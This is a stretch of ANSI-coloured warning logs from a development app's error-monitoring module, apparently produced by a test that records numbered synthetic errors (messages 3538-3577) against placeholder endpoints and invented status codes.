WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.877800Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m71[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3538'[0m [36merror_type[0m=[35merror_type_38[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_38[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m538[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.877848Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m71[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3539'[0m [36merror_type[0m=[35merror_type_39[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_39[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m539[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.877900Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m71[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3540'[0m [36merror_type[0m=[35merror_type_40[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_40[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m540[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.877988Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m71[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3541'[0m [36merror_type[0m=[35merror_type_41[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_41[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m541[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.878061Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m71[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3542'[0m [36merror_type[0m=[35merror_type_42[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_42[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m542[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.878118Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m71[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3543'[0m [36merror_type[0m=[35merror_type_43[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_43[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m543[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.878170Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m71[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3544'[0m [36merror_type[0m=[35merror_type_44[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_44[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m544[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.878273Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m71[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3545'[0m [36merror_type[0m=[35merror_type_45[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_45[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m545[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.878354Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m71[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3546'[0m [36merror_type[0m=[35merror_type_46[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_46[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m546[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.878412Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m71[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3547'[0m [36merror_type[0m=[35merror_type_47[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_47[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m547[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.878464Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m71[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3548'[0m [36merror_type[0m=[35merror_type_48[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_48[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m548[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.878515Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m71[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3549'[0m [36merror_type[0m=[35merror_type_49[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_49[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m549[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.878564Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m72[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3550'[0m [36merror_type[0m=[35merror_type_0[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_50[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m550[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.878614Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m72[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3551'[0m [36merror_type[0m=[35merror_type_1[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_51[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m551[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.878663Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m72[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3552'[0m [36merror_type[0m=[35merror_type_2[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_52[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m552[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.878711Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m72[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3553'[0m [36merror_type[0m=[35merror_type_3[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_53[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m553[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.878758Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m72[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3554'[0m [36merror_type[0m=[35merror_type_4[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_54[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m554[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.878806Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m72[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3555'[0m [36merror_type[0m=[35merror_type_5[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_55[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m555[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.878853Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m72[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3556'[0m [36merror_type[0m=[35merror_type_6[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_56[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m556[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.878901Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m72[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3557'[0m [36merror_type[0m=[35merror_type_7[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_57[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m557[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.878949Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m72[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3558'[0m [36merror_type[0m=[35merror_type_8[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_58[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m558[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.878997Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m72[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3559'[0m [36merror_type[0m=[35merror_type_9[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_59[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m559[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.879044Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m72[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3560'[0m [36merror_type[0m=[35merror_type_10[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_60[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m560[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.879095Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m72[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3561'[0m [36merror_type[0m=[35merror_type_11[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_61[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m561[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.879148Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m72[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3562'[0m [36merror_type[0m=[35merror_type_12[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_62[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m562[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.879199Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m72[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3563'[0m [36merror_type[0m=[35merror_type_13[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_63[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m563[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.879249Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m72[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3564'[0m [36merror_type[0m=[35merror_type_14[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_64[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m564[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.879299Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m72[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3565'[0m [36merror_type[0m=[35merror_type_15[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_65[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m565[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.879347Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m72[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3566'[0m [36merror_type[0m=[35merror_type_16[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_66[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m566[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.879395Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m72[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3567'[0m [36merror_type[0m=[35merror_type_17[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_67[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m567[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.879444Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m72[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3568'[0m [36merror_type[0m=[35merror_type_18[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_68[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m568[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.879493Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m72[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3569'[0m [36merror_type[0m=[35merror_type_19[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_69[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m569[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.879541Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m72[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3570'[0m [36merror_type[0m=[35merror_type_20[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_70[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m570[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.879590Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m72[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3571'[0m [36merror_type[0m=[35merror_type_21[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_71[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m571[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.879637Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m72[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3572'[0m [36merror_type[0m=[35merror_type_22[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_72[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m572[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.879686Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m72[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3573'[0m [36merror_type[0m=[35merror_type_23[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_73[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m573[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.879735Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m72[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3574'[0m [36merror_type[0m=[35merror_type_24[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_74[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m574[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.879822Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m72[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3575'[0m [36merror_type[0m=[35merror_type_25[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_75[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m575[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.879899Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m72[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3576'[0m [36merror_type[0m=[35merror_type_26[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_76[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m576[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.879957Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m72[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3577'[0m [36merror_type[0m=[35merror_type_27[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_77[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m577[0m
